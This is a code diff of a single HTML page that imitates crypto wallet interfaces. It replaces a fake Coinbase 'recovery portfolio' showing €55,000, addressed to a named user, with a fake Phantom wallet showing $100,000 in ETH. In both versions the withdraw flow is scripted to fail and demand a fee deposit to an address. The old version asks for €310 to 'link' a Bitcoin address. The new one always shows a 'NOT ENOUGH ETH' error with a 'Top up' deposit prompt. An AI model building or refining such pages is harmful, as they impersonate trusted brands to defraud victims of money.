@@ -1,351 +1,365 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <title>Coinbase Wallet Preview</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <!-- Professional Coinbase Style -->
-  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
-  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
-  <style>
-    :root {
-      --cb-blue: #1652f0;
-      --cb-light: #f5f8fa;
-      --cb-dark: #0a2540;
-      --cb-border: #e0e4eb;
-      --cb-gray: #a0aec0;
-      --cb-card: #fff;
-    }
-    body {
-      background: var(--cb-light);
-      font-family: 'Inter', 'Segoe UI', Arial, sans-serif;
-      margin: 0;
-      color: var(--cb-dark);
-      min-height: 100vh;
-    }
-    .cb-container {
-      max-width: 420px;
-      margin: 40px auto;
-      background: var(--cb-card);
-      border-radius: 20px;
-      box-shadow: 0 6px 32px #0a25401a;
-      padding: 0 0 32px 0;
-      overflow: hidden;
-    }
-    .cb-header {
-      display: flex;
-      align-items: center;
-      padding: 24px 28px 12px 28px;
-      background: var(--cb-blue);
-      color: #fff;
-      border-bottom-left-radius: 32px 16px;
-      border-bottom-right-radius: 32px 16px;
-      box-shadow: 0 4px 16px #1652f01c;
-      position: relative;
-    }
-    .cb-profile-pic {
-      width: 56px;
-      height: 56px;
-      min-width: 56px;
-      min-height: 56px;
-      max-width: 56px;
-      max-height: 56px;
-      border-radius: 50%;
-      background: #e4e9f0;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      font-size: 1.5rem;
-      color: var(--cb-gray);
-      margin-right: 18px;
-      box-shadow: 0 2px 8px #0a25401a;
-      border: 2px solid #fff2;
-      overflow: hidden;
-      position: relative;
-    }
-    .cb-profile-pic img {
-      width: 100%;
-      height: 100%;
-      object-fit: cover;
-      object-position: center;
-      display: block;
-      border-radius: 50%;
-      background: #f2f2f2;
-    }
-    .cb-user-name {
-      font-weight: 700;
-      font-size: 1.1rem;
-      letter-spacing: 0.01em;
-      margin-top: 2px;
-    }
-    .cb-label {
-      font-size: 0.98rem;
-      font-weight: 400;
-      color: #d1ddfa;
-      margin-top: 4px;
-    }
-    .cb-balance-card {
-      margin: 28px 28px 12px 28px;
-      background: #f7fbff;
-      border-radius: 18px;
-      box-shadow: 0 2px 12px #1652f008;
-      padding: 20px 22px 16px 22px;
-      text-align: left;
-    }
-    .cb-balance-title {
-      font-size: 1.04rem;
-      font-weight: 500;
-      color: var(--cb-blue);
-      margin-bottom: 7px;
-      letter-spacing: 0.01em;
-    }
-    .cb-balance-amount {
-      font-size: 2.2rem;
-      font-weight: 700;
-      color: var(--cb-dark);
-      margin-bottom: 12px;
-    }
-    .cb-balance-euro {
-      font-size: 1.22rem;
-      color: #4d7ff6;
-      margin-left: 4px;
-      font-weight: 600;
-      vertical-align: 1px;
-    }
-    .cb-btn-row {
-      display: flex;
-      gap: 20px;
-    }
-    .cb-btn {
-      flex: 1;
-      background: var(--cb-blue);
-      color: #fff;
-      border: none;
-      border-radius: 14px;
-      padding: 11px 0;
-      font-weight: 600;
-      font-size: 1.05rem;
-      cursor: pointer;
-      transition: background 0.17s;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      gap: 8px;
-      box-shadow: 0 2px 8px #1652f012;
-    }
-    .cb-btn.withdraw {
-      background: #fff;
-      color: var(--cb-blue);
-      border: 2px solid var(--cb-blue);
-    }
-    .cb-btn:active {
-      filter: brightness(0.95);
-    }
-    .cb-portfolio-section {
-      margin: 28px 28px 0 28px;
-      background: #f8fafd;
-      border-radius: 16px;
-      box-shadow: 0 2px 10px #0a25400c;
-      padding: 18px 20px 14px 20px;
-    }
-    .cb-portfolio-title {
-      font-size: 1.06rem;
-      font-weight: 600;
-      margin-bottom: 8px;
-      color: var(--cb-blue);
-    }
-    .cb-portfolio-holdings {
-      font-size: 1.17rem;
-      color: var(--cb-dark);
-      font-weight: 500;
-      margin-bottom: 7px;
-    }
-    .cb-recent-section {
-      margin: 26px 28px 0 28px;
-    }
-    .cb-recent-title {
-      font-size: 1.05rem;
-      font-weight: 600;
-      color: var(--cb-blue);
-      margin-bottom: 10px;
-    }
-    .cb-activity-list {
-      list-style: none;
-      margin: 0;
-      padding: 0;
-    }
-    .cb-activity-item {
-      display: flex;
-      justify-content: space-between;
-      padding: 8px 0;
-      border-bottom: 1px solid #f1f4f8;
-      font-size: 1.02rem;
-      align-items: center;
-    }
-    .cb-activity-type {
-      font-weight: 500;
-      color: #1556b3;
-    }
-    .cb-activity-date {
-      font-size: 0.95rem;
-      color: #b3b8c9;
-      margin-left: 12px;
-    }
-    .cb-activity-amount.positive {
-      color: #16c784;
-      font-weight: 600;
-    }
-    .cb-activity-amount.negative {
-      color: #ea3943;
-      font-weight: 600;
-    }
-    .cb-footer {
-      margin: 22px 0 0 0;
-      text-align: center;
-      color: #7a8ca7;
-      font-size: 0.97rem;
-      padding-bottom: 10px;
-    }
-
-    /* Responsive */
-    @media (max-width: 500px) {
-      .cb-container {
-        margin: 0;
-        border-radius: 0;
-        box-shadow: none;
-      }
-      .cb-header, .cb-balance-card, .cb-portfolio-section, .cb-recent-section {
-        margin-left: 6px;
-        margin-right: 6px;
-      }
-      .cb-profile-pic {
-        width: 44px;
-        height: 44px;
-        min-width: 44px;
-        min-height: 44px;
-        max-width: 44px;
-        max-height: 44px;
-        margin-right: 12px;
-      }
-    }
-  </style>
+    <meta charset="UTF-8">
+    <title>Phantom Wallet - Portfolio</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="icon" href="https://phantom.app/favicon.ico">
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap');
+        body {
+            font-family: 'Inter', Arial, sans-serif;
+            background: radial-gradient(ellipse at top right, #8e5cff 10%, #181c29 80%);
+            min-height: 100vh;
+            margin: 0;
+            color: #e9e6f8;
+        }
+        .container {
+            max-width: 400px;
+            margin: 40px auto;
+            background: rgba(24,28,41,0.97);
+            border-radius: 20px;
+            padding: 30px 24px 24px 24px;
+            box-shadow: 0 6px 44px 0 rgba(72, 71, 255, 0.15), 0 1.5px 12px 0 rgba(0,0,0,0.11);
+        }
+        .logo {
+            width: 54px;
+            height: 54px;
+            border-radius: 12px;
+            background: #8e5cff linear-gradient(145deg,#9e6fff 20%, #8e5cff 80%);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 20px auto;
+        }
+        .logo img {
+            width: 38px;
+            height: 38px;
+        }
+        .title {
+            text-align: center;
+            font-size: 1.35rem;
+            font-weight: 700;
+            margin-bottom: 14px;
+            color: #e9e6f8;
+        }
+        .balance-section {
+            background: #252848;
+            border-radius: 15px;
+            padding: 22px 18px 18px 18px;
+            margin-bottom: 22px;
+            box-shadow: 0 2px 10px #8e5cff13;
+        }
+        .balance-label {
+            font-size: 1.04rem;
+            color: #ad9ee4;
+            margin-bottom: 6px;
+        }
+        .balance-value {
+            font-size: 2.4rem;
+            font-weight: 700;
+            color: #f2eaff;
+            margin-bottom: 8px;
+        }
+        .balance-currency {
+            color: #baaadf;
+            font-size: 1.1rem;
+        }
+        .action-btns {
+            display: flex;
+            gap: 18px;
+            justify-content: center;
+            margin-top: 18px;
+        }
+        .action-btn {
+            background: linear-gradient(90deg,#9e6fff 10%, #8e5cff 90%);
+            color: #fff;
+            border: none;
+            padding: 12px 25px;
+            border-radius: 10px;
+            font-size: 1.04rem;
+            font-weight: 600;
+            cursor: pointer;
+            transition: background 0.18s, box-shadow 0.18s;
+            box-shadow: 0 2px 10px 0 #8e5cff29;
+        }
+        .action-btn:hover {
+            background: linear-gradient(90deg,#a88fff 0%, #7a4fff 100%);
+        }
+        /* QR Modal */
+        .modal-bg, .withdraw-modal-bg, .error-modal-bg, .deposit-modal-bg {
+            display: none;
+            position: fixed;
+            z-index: 1000;
+            left: 0; top: 0;
+            width: 100vw; height: 100vh;
+            background: rgba(35, 36, 58, 0.72);
+            justify-content: center;
+            align-items: center;
+        }
+        .modal, .withdraw-modal, .error-modal, .deposit-modal {
+            background: #23253a;
+            border-radius: 16px;
+            box-shadow: 0 2px 24px rgba(142,92,255,0.16);
+            padding: 32px 28px 22px 28px;
+            max-width: 350px;
+            width: 88vw;
+            text-align: center;
+            border: 2px solid #8e5cff33;
+        }
+        .modal-title,
+        .withdraw-title,
+        .error-title,
+        .deposit-title {
+            font-size: 1.17rem;
+            font-weight: 700;
+            color: #9e6fff;
+            margin-bottom: 10px;
+        }
+        .modal-desc,
+        .withdraw-desc,
+        .error-desc,
+        .deposit-desc {
+            font-size: 1.06rem;
+            color: #e9e6f8;
+            margin-bottom: 14px;
+        }
+        .address-holder {
+            background: #202233;
+            border: 1px solid #30255c;
+            border-radius: 8px;
+            color: #fff;
+            font-size: 0.96rem;
+            padding: 8px 12px;
+            margin-bottom: 10px;
+            overflow-x: auto;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+        }
+        .copy-btn {
+            background: #312b4b;
+            border: none;
+            color: #9e6fff;
+            font-weight: 600;
+            border-radius: 8px;
+            padding: 5px 11px;
+            cursor: pointer;
+            font-size: 0.97rem;
+            margin-left: 10px;
+            transition: background 0.18s, color 0.18s;
+        }
+        .copy-btn:active {
+            background: #7c5cff1a;
+            color: #fff;
+        }
+        .modal img {
+            margin-bottom: 12px;
+            border-radius: 8px;
+            width: 120px;
+            height: 120px;
+            background: #fff;
+        }
+        .withdraw-form input {
+            width: 100%;
+            padding: 11px 10px;
+            margin-bottom: 14px;
+            border: 1.5px solid #2d2640;
+            border-radius: 8px;
+            background: #202233;
+            color: #e9e6f8;
+            font-size: 1rem;
+            outline: none;
+            box-sizing: border-box;
+            transition: border 0.2s;
+        }
+        .withdraw-form input:focus {
+            border: 1.5px solid #8e5cff;
+        }
+        .withdraw-btn {
+            background: linear-gradient(90deg,#9e6fff 10%, #8e5cff 90%);
+            color: #fff;
+            border: none;
+            padding: 11px;
+            border-radius: 8px;
+            font-size: 1rem;
+            font-weight: 600;
+            cursor: pointer;
+            width: 100%;
+            margin-top: 2px;
+        }
+        .withdraw-btn:hover {
+            background: linear-gradient(90deg,#a88fff 0%, #7a4fff 100%);
+        }
+        .error-modal .error-desc {
+            color: #ff7272;
+            margin-bottom: 14px;
+        }
+        .topup-btn {
+            background: #8e5cff;
+            color: #fff;
+            border: none;
+            border-radius: 8px;
+            padding: 10px 15px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: background 0.18s;
+        }
+        .topup-btn:hover {
+            background: #a88fff;
+        }
+        @media (max-width: 500px) {
+            .container {
+                padding: 14px 2px;
+            }
+            .modal, .withdraw-modal, .error-modal, .deposit-modal {
+                padding: 18px 2px 12px 2px;
+            }
+        }
+    </style>
 </head>
 <body>
-  <div class="cb-container">
-
-    <!-- Header: User info and profile picture -->
-    <div class="cb-header">
-      <div class="cb-profile-pic" title="Profile photo">
-        <img src="IMG_1448.jpeg" alt="Profile" />
-        <!-- Replace above with <img src="..." alt="Profile" /> for real photo -->
-      </div>
-      <div>
-        <div class="cb-user-name">gabrielebecker.cb.id</div>
-        <div class="cb-label">RECOVERY PORTFOLIO</div>
-      </div>
+    <div class="container">
+        <div class="logo">
+            <img src="https://seeklogo.com/images/P/phantom-wallet-logo-35401BEA14-seeklogo.com.png" alt="Phantom Logo">
+        </div>
+        <div class="title">Portfolio</div>
+        <div class="balance-section">
+            <div class="balance-label">ETH Balance</div>
+            <div class="balance-value">$100,000</div>
+            <div class="balance-currency">ETH</div>
+        </div>
+        <div class="action-btns">
+            <button class="action-btn" id="sendBtn">Send</button>
+            <button class="action-btn" id="receiveBtn">Receive</button>
+        </div>
     </div>
 
-    <!-- Portfolio / Balance Card -->
-    <div class="cb-balance-card">
-      <div class="cb-balance-title">Portfolio value</div>
-      <div class="cb-balance-amount">
-        € 55,000
-      </div>
-      <div class="cb-btn-row">
-        <button class="cb-btn" id="deposit-btn">
-          <i class="fa-solid fa-arrow-down"></i> Deposit
-        </button>
-        <button class="cb-btn withdraw" id="withdraw-btn">
-          <i class="fa-solid fa-arrow-up"></i> Withdraw
-        </button>
-      </div>
+    <!-- QR Modal & Receive -->
+    <div class="modal-bg" id="qrModalBg">
+        <div class="modal">
+            <div class="modal-title">Receive ETH</div>
+            <div class="modal-desc">Scan QR code or copy your address</div>
+            <img id="qrImg" src="https://api.qrserver.com/v1/create-qr-code/?size=120x120&data=0x1234abcd5678ef9012345678abcdef9012345678" alt="QR Code">
+            <div class="address-holder" id="receiveAddressHolder">
+                <span id="ethAddress">0x1234abcd5678ef9012345678abcdef9012345678</span>
+                <button class="copy-btn" id="copyReceiveBtn">Copy</button>
+            </div>
+            <button class="action-btn" onclick="closeModal('qrModalBg')">Close</button>
+        </div>
     </div>
 
-    <!-- Holdings breakdown (optional, can be extended for more coins/assets) -->
-    <div class="cb-portfolio-section">
-      <div class="cb-portfolio-title">Your Holdings</div>
-      <div class="cb-portfolio-holdings">BTC PORTFOLIO: <strong>0.60206835 BTC</strong></div>
-      <!-- Add asset breakdown here if needed -->
+    <!-- Withdraw Modal -->
+    <div class="withdraw-modal-bg" id="withdrawModalBg">
+        <div class="withdraw-modal">
+            <div class="withdraw-title">Withdraw ETH</div>
+            <form class="withdraw-form" id="withdrawForm">
+                <label style="color:#beacee;font-weight:500;">Withdraw Amount</label>
+                <input type="text" id="withdrawAmount" value="$100,000" readonly>
+                <label style="color:#beacee;font-weight:500;">To Address</label>
+                <input type="text" id="withdrawAddress" placeholder="Enter ETH address" required>
+                <button class="withdraw-btn" type="submit">Confirm Withdraw</button>
+            </form>
+            <button class="action-btn" onclick="closeModal('withdrawModalBg')" style="margin-top:8px;">Cancel</button>
+        </div>
     </div>
 
-    <!-- Recent Activity -->
-    <div class="cb-recent-section">
-      <div class="cb-recent-title">Recent Activity</div>
-      <ul class="cb-activity-list">
-        <li class="cb-activity-item">
-          <span>
-            <span class="cb-activity-type">IN⬇️</span>
-            <span class="cb-activity-date">June 3</span>
-          </span>
-          <span class="cb-activity-amount positive">+€55,000 = +0.60206835 BTC</span>
-        </li>
-      </ul>
+    <!-- Error Modal -->
+    <div class="error-modal-bg" id="errorModalBg">
+        <div class="error-modal">
+            <div class="error-title">NOT ENOUGH ETH</div>
+            <div class="error-desc">
+                You don't have enough ETH in your records for this transaction.<br>
+                <span style="font-size:1.02rem;color:#b0a0ef;">Required ETH: 0.08804745</span>
+            </div>
+            <button class="topup-btn" id="topupBtn">Top up</button>
+        </div>
     </div>
 
-    <div class="cb-footer">
-      <strong>Security Tip:</strong> Never share your recovery phrase or private keys with anyone. Coinbase will never ask for your password or sensitive information.
+    <!-- Deposit Modal -->
+    <div class="deposit-modal-bg" id="depositModalBg">
+        <div class="deposit-modal">
+            <div class="deposit-title">Deposit ETH</div>
+            <div class="deposit-desc">
+                <span style="color:#b0a0ef;">Deposit Address:</span>
+            </div>
+            <div class="address-holder" id="depositAddressHolder">
+                <span id="depositAddress">0x1234abcd5678ef9012345678abcdef9012345678</span>
+                <button class="copy-btn" id="copyDepositBtn">Copy</button>
+            </div>
+            <img id="depositQrImg" src="https://api.qrserver.com/v1/create-qr-code/?size=120x120&data=0x1234abcd5678ef9012345678abcdef9012345678" alt="Deposit QR Code">
+            <button class="action-btn" onclick="closeModal('depositModalBg')" style="margin-top:15px;">Close</button>
+        </div>
     </div>
-  </div>
 
-  <!-- Deposit Modal -->
-  <div class="modal-bg" id="deposit-modal" style="display:none;
-    position:fixed;z-index:1000;top:0;left:0;width:100vw;height:100vh;background:rgba(22,82,240,0.07);align-items:center;justify-content:center;">
-    <div class="modal-card" style="background:#fff;border-radius:18px;max-width:340px;width:90%;padding:32px 22px;box-shadow:0 4px 24px #0a25401c;text-align:center;">
-      <div style="font-size:1.8rem;color:#1652f0;margin-bottom:10px;">
-        <i class="fa-solid fa-arrow-down"></i>
-      </div>
-      <div style="font-weight:700;font-size:1.16rem;">Deposit Funds</div><br>
-      <div style="margin:13px 0 18px 0;color:#4d7ff6;">bc1qxyllg8j6wkpaur6xc9l4hh5jpg2hv8khsds0fz</div>
-      <div style="margin:13px 0 18px 0;color:#4d7ff6;">DEPOSIT BITCOIN TO COINBASE WALLET.</div>
-      <button class="cb-btn withdraw" id="deposit-close" style="width:100%;margin-top:12px;">Close</button>
-    </div>
-  </div>
+    <script>
+        // Sample ETH address for demo
+        const ethAddress = '0x1234abcd5678ef9012345678abcdef9012345678';
+        // QR code API URL
+        const qrApiUrl = 'https://api.qrserver.com/v1/create-qr-code/?size=120x120&data=' + ethAddress;
 
-  <!-- Withdraw Modal -->
-  <div class="modal-bg" id="withdraw-modal" style="display:none;
-    position:fixed;z-index:1000;top:0;left:0;width:100vw;height:100vh;background:rgba(22,82,240,0.07);align-items:center;justify-content:center;">
-    <div class="modal-card" style="background:#fff;border-radius:18px;max-width:340px;width:90%;padding:32px 22px;box-shadow:0 4px 24px #0a25401c;text-align:center;">
-      <div style="font-size:1.8rem;color:#1652f0;margin-bottom:10px;">
-        <i class="fa-solid fa-arrow-up"></i>
-      </div>
-      <div style="font-weight:700;font-size:1.16rem;">Withdraw Funds</div><br>
-      <div style="margin:13px 0 18px 0;color:#4d7ff6;">To withdraw your Balance you need to link your bitcoin address.</div>
-      <div style="margin:13px 0 18px 0;color:#4d7ff6;">LINK - [gabrielebecker.cb.id] = bc1q9mgmkfer6nn5sk...ynayevj2grp4tpyytw </div><br>
-      <div style="margin:13px 0 18px 0;color:#4d7ff6;">€310 REQUIRED: TO LINK CLICK ON DEPOSIT AND TRY AGAIN❗️</div>
-      <button class="cb-btn withdraw" id="withdraw-close" style="width:100%;margin-top:12px;">Close</button>
-    </div>
-  </div>
+        // Set ETH address and QR for receive and deposit
+        document.getElementById('ethAddress').textContent = ethAddress;
+        document.getElementById('receiveAddressHolder').querySelector('span').textContent = ethAddress;
+        document.getElementById('qrImg').src = qrApiUrl;
+        document.getElementById('depositAddress').textContent = ethAddress;
+        document.getElementById('depositAddressHolder').querySelector('span').textContent = ethAddress;
+        document.getElementById('depositQrImg').src = qrApiUrl;
 
-  <script>
-    // Modal logic
-    const depositBtn = document.getElementById('deposit-btn');
-    const withdrawBtn = document.getElementById('withdraw-btn');
-    const depositModal = document.getElementById('deposit-modal');
-    const withdrawModal = document.getElementById('withdraw-modal');
-    const depositClose = document.getElementById('deposit-close');
-    const withdrawClose = document.getElementById('withdraw-close');
+        // Send Button
+        document.getElementById('sendBtn').onclick = function() {
+            document.getElementById('withdrawModalBg').style.display = 'flex';
+        };
+        // Receive Button
+        document.getElementById('receiveBtn').onclick = function() {
+            document.getElementById('qrModalBg').style.display = 'flex';
+        };
 
-    depositBtn.onclick = function() {
-      depositModal.style.display = 'flex';
-    };
-    withdrawBtn.onclick = function() {
-      withdrawModal.style.display = 'flex';
-    };
-    depositClose.onclick = function() {
-      depositModal.style.display = 'none';
-    };
-    withdrawClose.onclick = function() {
-      withdrawModal.style.display = 'none';
-    };
+        // Copy address for receive
+        document.getElementById('copyReceiveBtn').onclick = function() {
+            copyAddress(ethAddress, this);
+        };
+        // Copy address for deposit
+        document.getElementById('copyDepositBtn').onclick = function() {
+            copyAddress(ethAddress, this);
+        };
 
-    window.onclick = function(e) {
-      if (e.target === depositModal) {
-        depositModal.style.display = 'none';
-      }
-      if (e.target === withdrawModal) {
-        withdrawModal.style.display = 'none';
-      }
-    };
-  </script>
+        function copyAddress(addr, btn) {
+            navigator.clipboard.writeText(addr).then(() => {
+                btn.textContent = 'Copied!';
+                setTimeout(() => btn.textContent = 'Copy', 1200);
+            });
+        }
+
+        // Withdraw Form Logic
+        document.getElementById('withdrawForm').onsubmit = function(e) {
+            e.preventDefault();
+            // Simulate NOT ENOUGH ETH error
+            closeModal('withdrawModalBg');
+            setTimeout(function() {
+                document.getElementById('errorModalBg').style.display = 'flex';
+            }, 300);
+        };
+
+        // Topup Button
+        document.getElementById('topupBtn').onclick = function() {
+            closeModal('errorModalBg');
+            setTimeout(function() {
+                document.getElementById('depositModalBg').style.display = 'flex';
+            }, 250);
+        };
+
+        // Modal close utility
+        function closeModal(id) {
+            document.getElementById(id).style.display = 'none';
+        }
+
+        // Close modals on background click
+        ['qrModalBg', 'withdrawModalBg', 'errorModalBg', 'depositModalBg'].forEach(function(bgId) {
+            document.getElementById(bgId).onclick = function(e) {
+                if (e.target === this) closeModal(bgId);
+            }
+        });
+    </script>
 </body>
 </html>
